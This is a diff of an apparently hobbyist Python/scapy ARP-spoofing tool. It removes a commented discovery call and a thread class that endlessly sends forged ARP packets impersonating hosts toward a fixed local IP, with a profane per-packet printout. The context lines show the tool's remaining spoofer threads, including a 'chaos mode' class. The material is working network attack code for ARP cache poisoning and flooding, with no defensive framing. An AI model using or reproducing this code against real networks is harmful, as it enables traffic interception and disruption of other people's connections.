@@ -16,8 +16,6 @@ def get_mac(ip_address):
     return None
 
 
-# def arp_discovry():
-# srploop(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst='192.168.113.254'), timeout=2)
 
 
 def sendFakeReply(src_ip, src_mac, dst_ip, dst_mac):
@@ -94,30 +92,6 @@ def main():
     for i in range(size):
         spoofer = ArpSpoofer(target_queqe, gateway_ip=option.gateway, gateway_mac=gateway_mac, reverse=option.reverse)
         spoofer.start()
-
-
-#   for i in range(size):
-#         attackOne = TargetOne(target_queqe, '192.168.113.254')
-#        attackOne.start()
-
-# 没什么杀伤力,刷屏还可以
-class TargetOne(threading.Thread):
-    def __init__(self, queue, targetIP):
-        threading.Thread.__init__(self)
-        self.queue = queue
-        self.targetIP = targetIP
-
-    def run(self):
-        while True:
-            try:
-                dic = self.queue.get()
-            except Queue.Empty:
-                break
-            while True:
-                # sendFakeReply(src_ip='192.168.113.254', src_mac='44:44:44:44:44:44', dst_ip=dic['ip'],dst_mac=dic['mac'])
-                sendp(Ether(src=dic['mac']) / ARP(hwsrc=dic['mac'], psrc=dic['ip'], pdst=self.targetIP, op=1),
-                      verbose=False)
-                print 'Fucking %s' % dic['ip']
 
 # 混乱模式
 class FunnyArpSpoofer(threading.Thread):
